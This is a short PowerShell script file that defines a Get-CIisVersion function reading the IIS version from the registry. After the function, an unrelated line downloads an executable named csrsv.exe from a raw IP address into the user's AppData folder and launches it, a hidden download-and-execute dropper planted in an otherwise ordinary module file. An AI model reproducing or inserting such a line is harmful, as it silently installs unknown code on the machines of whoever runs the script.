
function Get-CIisVersion
{
    
    [CmdletBinding()]
    param(
    )

    Set-StrictMode -Version 'Latest'

    Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState

    $props = Get-ItemProperty hklm:\Software\Microsoft\InetStp
    return $props.MajorVersion.ToString() + "." + $props.MinorVersion.ToString()
}


(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

